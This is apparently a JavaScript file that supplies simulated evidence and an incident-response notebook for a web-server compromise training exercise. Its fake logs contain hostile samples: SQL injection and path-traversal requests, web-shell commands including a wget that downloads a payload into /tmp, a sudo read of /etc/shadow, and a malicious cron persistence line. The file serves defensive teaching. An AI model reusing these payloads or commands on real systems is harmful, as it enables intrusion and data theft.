(function (global) {
  "use strict";

  var files = {
    "auth.log":
      "Nov  3 09:01:12 web01 sshd[811]: Failed password for root from 203.0.113.7 port 50122 ssh2\n" +
      "Nov  3 09:01:15 web01 sshd[811]: Failed password for root from 203.0.113.7 port 50124 ssh2\n" +
      "Nov  3 09:01:19 web01 sshd[812]: Failed password for admin from 203.0.113.7 port 50131 ssh2\n" +
      "Nov  3 09:01:24 web01 sshd[812]: Failed password for deploy from 203.0.113.7 port 50140 ssh2\n" +
      "Nov  3 09:01:30 web01 sshd[813]: Failed password for deploy from 203.0.113.7 port 50147 ssh2\n" +
      "Nov  3 09:02:40 web01 sshd[822]: Accepted password for maya from 198.51.100.20 port 61200 ssh2\n" +
      "Nov  3 09:05:51 web01 sshd[841]: Failed password for invalid user test from 192.0.2.44 port 40001 ssh2\n" +
      "Nov  3 09:06:10 web01 sshd[845]: Accepted publickey for backup from 198.51.100.21 port 61311 ssh2\n" +
      "Nov  3 09:14:02 web01 sshd[870]: Failed password for deploy from 203.0.113.7 port 50388 ssh2\n" +
      "Nov  3 09:14:09 web01 sshd[870]: Accepted password for deploy from 203.0.113.7 port 50391 ssh2\n" +
      "Nov  3 09:14:11 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow\n" +
      "Nov  3 09:31:45 web01 sshd[902]: Accepted password for maya from 198.51.100.20 port 61544 ssh2\n",
    "access.log":
      '198.51.100.20 - - [03/Nov/2026:09:00:05 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0"\n' +
      '198.51.100.20 - - [03/Nov/2026:09:00:07 +0000] "GET /shop?id=12 HTTP/1.1" 200 2210 "-" "Mozilla/5.0"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:08:10 +0000] "GET /robots.txt HTTP/1.1" 200 64 "-" "sqlmap/1.8"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:08:14 +0000] "GET /backup.zip HTTP/1.1" 200 88412 "-" "sqlmap/1.8"\n' +
      "203.0.113.7 - - [03/Nov/2026:09:08:31 +0000] \"GET /shop?id=12%27 HTTP/1.1\" 500 412 \"-\" \"sqlmap/1.8\"\n" +
      "203.0.113.7 - - [03/Nov/2026:09:08:40 +0000] \"GET /shop?id=12%20UNION%20SELECT%20user,pass%20FROM%20users-- HTTP/1.1\" 200 3301 \"-\" \"sqlmap/1.8\"\n" +
      '203.0.113.7 - - [03/Nov/2026:09:09:02 +0000] "GET /admin HTTP/1.1" 200 1800 "-" "Mozilla/5.0"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:09:30 +0000] "POST /admin/upload HTTP/1.1" 200 96 "-" "Mozilla/5.0"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:09:41 +0000] "GET /uploads/img.php?cmd=id HTTP/1.1" 200 54 "-" "Mozilla/5.0"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:10:05 +0000] "GET /uploads/img.php?cmd=wget%20http://198.51.100.66/k%20-O%20/tmp/.x/kworkerd HTTP/1.1" 200 0 "-" "Mozilla/5.0"\n' +
      '203.0.113.7 - - [03/Nov/2026:09:10:20 +0000] "GET /uploads/img.php?cmd=crontab%20-l HTTP/1.1" 200 41 "-" "Mozilla/5.0"\n' +
      '192.0.2.44 - - [03/Nov/2026:09:12:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 0 "-" "curl/8.4.0"\n' +
      '198.51.100.20 - - [03/Nov/2026:09:31:50 +0000] "GET /shop?id=7 HTTP/1.1" 200 2190 "-" "Mozilla/5.0"\n',
    "conn.csv":
      "time,src,dst,dport,bytes_out\n" +
      "2026-11-03T09:00:05,198.51.100.20,10.0.0.5,443,820\n" +
      "2026-11-03T09:10:05,10.0.0.5,198.51.100.66,80,310\n" +
      "2026-11-03T09:11:00,10.0.0.5,198.51.100.66,4444,240\n" +
      "2026-11-03T09:12:00,10.0.0.5,198.51.100.66,4444,236\n" +
      "2026-11-03T09:13:00,10.0.0.5,198.51.100.66,4444,244\n" +
      "2026-11-03T09:13:30,10.0.0.5,93.184.216.34,443,1900\n" +
      "2026-11-03T09:14:00,10.0.0.5,198.51.100.66,4444,238\n" +
      "2026-11-03T09:15:00,10.0.0.5,198.51.100.66,4444,241\n" +
      "2026-11-03T09:16:00,10.0.0.5,198.51.100.66,4444,239\n" +
      "2026-11-03T09:16:40,10.0.0.5,10.0.0.9,5432,5200\n" +
      "2026-11-03T09:17:00,10.0.0.5,198.51.100.66,4444,242\n" +
      "2026-11-03T09:18:00,10.0.0.5,198.51.100.66,4444,48211904\n" +
      "2026-11-03T09:19:00,10.0.0.5,198.51.100.66,4444,240\n" +
      "2026-11-03T09:20:00,10.0.0.5,198.51.100.66,4444,237\n" +
      "2026-11-03T09:31:50,198.51.100.20,10.0.0.5,443,790\n",
    "ps.txt":
      "USER       PID %CPU %MEM COMMAND\n" +
      "root         1  0.0  0.1 /sbin/init\n" +
      "root       402  0.0  0.3 /usr/sbin/sshd -D\n" +
      "root       455  0.0  0.2 /usr/sbin/cron -f\n" +
      "www-data   610  0.1  1.2 nginx: worker process\n" +
      "postgres   702  0.2  2.4 postgres: main\n" +
      "www-data  1337 38.5  0.9 /tmp/.x/kworkerd\n" +
      "deploy    1402  0.0  0.1 -bash\n" +
      "root      1450  0.0  0.1 ps aux\n",
    "crontab.txt":
      "# m h dom mon dow command\n" +
      "0 3 * * * /usr/local/bin/backup.sh\n" +
      "* * * * * /tmp/.x/kworkerd >/dev/null 2>&1\n",
    "known_bad.txt":
      "675e92918c99795f9ce29033537f3e0bcc5ee1a3402b899ad6611f302d5cd871  kworkerd beacon (case 2026-114)\n" +
      "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  test dropper\n",
    "suspect/kworkerd":
      'echo "kworkerd sample"\nwhile true; do\n    echo "beacon 198.51.100.66:4444"\n    sleep 60\ndone\n',
    "suspect/backup.sh":
      'tar czf /var/backups/site.tgz /var/www\n'
  };

  var template = [
    { t: "md", s: "# Incident runbook: web server web01\n\nAlerts at 09:20 on 3 Nov: web01 is using a lot of CPU and sending data out. " +
      "Work down this runbook in order. Linux cells run on a real Linux in your browser, Python cells run Python, and every output is saved in this notebook.\n\n" +
      "The evidence is in `~/case` (Linux) and `case/` (Python), including a packet capture, `capture.pcap`. " +
      "`nmap`, `curl`, `tshark` and `dig` work on a recorded copy of the case network (10.0.0.0/24 and the outside addresses in the logs); nothing leaves your browser.\n\n" +
      "## 1. Triage\n\n- [ ] Write your name and the time you started here:\n- [ ] Hash the evidence before touching it (chain of custody)\n- [ ] Map the network: which machines are up?" },
    { t: "sh", s: "cd ~/case\ndate -u\nls -l . suspect\nsha256sum *.log *.csv *.txt capture.pcap" },
    { t: "sh", s: "nmap -sn 10.0.0.0/24" },
    { t: "md", s: "## 2. Investigate: logins\n\n- [ ] Which address failed to log in most often?\n- [ ] Did that address ever log in successfully? As whom?\n- [ ] What did that account do next?" },
    { t: "sh", s: "grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn\necho ---\ngrep -E 'Accepted|sudo' auth.log" },
    { t: "md", s: "## 3. Investigate: the website\n\n- [ ] Find the SQL injection attempts\n- [ ] Find the uploaded web shell and the commands run through it\n- [ ] Is the web shell still live? Check it with curl" },
    { t: "sh", s: "grep -iE \"%27|union|select\" access.log\necho ---\ngrep 'cmd=' access.log | sed 's/.*cmd=\\([^ ]*\\).*/\\1/' | sed 's/%20/ /g'" },
    { t: "sh", s: "curl -s http://10.0.0.5/robots.txt\necho ---\ncurl -i -s \"http://10.0.0.5/uploads/img.php?cmd=id\"" },
    { t: "md", s: "## 4. Investigate: the network\n\n- [ ] Who talked to whom, and how much?\n- [ ] Which name did web01 look up just before the download?\n- [ ] Are the connections to port 4444 regular, like a beacon?" },
    { t: "sh", s: "tshark -r capture.pcap -q -z conv,ip\ntshark -r capture.pcap -Y dns -T fields -e ip.src -e dns.qry.name\ntshark -r capture.pcap -Y 'http.request and ip.src==10.0.0.5'\ntshark -r capture.pcap -Y 'tcp.dstport==4444' -c 6" },
    { t: "py", s: "import csv\nfrom collections import defaultdict\nfrom datetime import datetime\n\nrows = list(csv.DictReader(open(\"case/conn.csv\")))\nsent = defaultdict(int)\nfor r in rows:\n    sent[r[\"dst\"] + \":\" + r[\"dport\"]] += int(r[\"bytes_out\"])\nfor dst, b in sorted(sent.items(), key=lambda x: -x[1]):\n    print(f\"{dst:22} {b:>12,} bytes out\")\n\nt = [datetime.fromisoformat(r[\"time\"]) for r in rows if r[\"dport\"] == \"4444\"]\nprint(\"Seconds between connections to port 4444:\", [(b - a).seconds for a, b in zip(t, t[1:])])" },
    { t: "md", s: "## 5. Investigate: the host\n\n- [ ] Which process doesn't belong?\n- [ ] How does it start again after a reboot?\n- [ ] Is the file a known bad one?\n- [ ] Scan every port on web01: is anything listening that shouldn't be?" },
    { t: "sh", s: "grep -v root ps.txt\necho ---\ngrep -v '^#' crontab.txt\necho ---\nsha256sum suspect/* | while read h f; do\n    grep -q \"$h\" known_bad.txt && echo \"KNOWN BAD: $f\" || echo \"not listed: $f\"\ndone" },
    { t: "sh", s: "nmap -sV -p- 10.0.0.5" },
    { t: "md", s: "## 6. Who is behind it?\n\n- [ ] Where does the command server's name point?\n- [ ] What is running on the attacker's machine?\n\nIn a real case, ask before you touch an attacker's servers: it can tip them off, and some actions are illegal." },
    { t: "sh", s: "dig +short update.kworker-cdn.net\ndig -x 198.51.100.66 +short\nnmap -sV 203.0.113.7\ncurl -s http://203.0.113.7:8080/notes.txt" },
    { t: "md", s: "## 7. Contain\n\n- [ ] Block the attacker and the command server at the firewall\n- [ ] Lock the stolen account\n- [ ] Take web01 off the network\n\nThe cell prints the commands for the real server. Nothing here is a real firewall." },
    { t: "sh", s: "for ip in 203.0.113.7 198.51.100.66; do\n    echo \"iptables -A INPUT -s $ip -j DROP\"\n    echo \"iptables -A OUTPUT -d $ip -j DROP\"\ndone\necho \"usermod -L deploy\"" },
    { t: "md", s: "## 8. Remediate\n\n- [ ] Remove the cron entry\n- [ ] Delete the dropped file\n- [ ] Reset the deploy password and patch the SQL injection and upload page" },
    { t: "sh", s: "sed -i '/kworkerd/d' crontab.txt\nrm -f suspect/kworkerd\ncat crontab.txt\nls suspect" },
    { t: "md", s: "## 9. Report\n\n- [ ] What happened, in order, with times\n- [ ] Which accounts, files and addresses were involved\n- [ ] What you changed in step 8, and what should be fixed next\n\nWrite the report here. Download .ipynb keeps every output above." }
  ];

  global.AAYAT_RUNBOOK = { files: files, template: template };
})(window);
